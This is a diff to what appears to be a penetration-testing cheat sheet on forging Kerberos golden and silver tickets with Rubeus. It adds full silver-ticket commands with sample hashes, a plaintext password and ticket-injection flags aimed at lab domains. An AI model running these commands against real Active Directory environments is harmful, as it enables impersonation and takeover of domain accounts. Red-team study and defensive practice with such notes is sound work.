@@ -506,6 +506,8 @@ Rubeus.exe asktgs /user:admin /ticket:doIDF.. /service:LDAP/dc1.ecorp.lab
 
 #### Golden:
 
+```\rc4``` or ```\aes256``` etc as krbtgt hash
+
 optional:
 - ```/ldap``` - fetch details for user identity you are forging to better impersonate
 - ```/printcmd``` - oneliner based on those full details to forge same ticket later
@@ -517,18 +519,23 @@ rubeus.exe golden /user:DAdmin123 /rc4:EA2344691D140975946372D18949706857EB9C5F6
 ```
 
 #### Silver:
+```\rc4``` or ```\aes256``` etc as service hash for arbitrary user:
+
+```
+rubeus.exe silver /user:Bob /ldap /service:cifs/dc1.ecorp.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03
+```
 
 optional:
 - ```/ldap``` - fetch details for user identity you are forging to better impersonate
-- ```/creduser``` -
+- ```/creduser``` - using LDAP with alternate credentials to get the PAC information
 - ```/credpassword``` -
-- ```/krbkey``` - 
+- ```/krbkey``` - create the KDCChecksum and TicketChecksum if it is a referral ticket
 - ```/krbenctype``` - 
 - ```/domain``` - specify domain
 - ```/ptt``` - inject ticket
 
 ```
-rubeus.exe silver /service:cifs/dc1.ignite.local /user:whoever /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /domain:ecorp.lab /ldap /creduser:ecorp.lab\Administrator /credpassword:Password01  /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /ptt
+rubeus.exe silver /service:cifs/dc1.ecorp.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ecorp.lab\Administrator /credpassword:Password01 /user:whoever /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ecorp.lab /ptt
 ```
 
 * * *
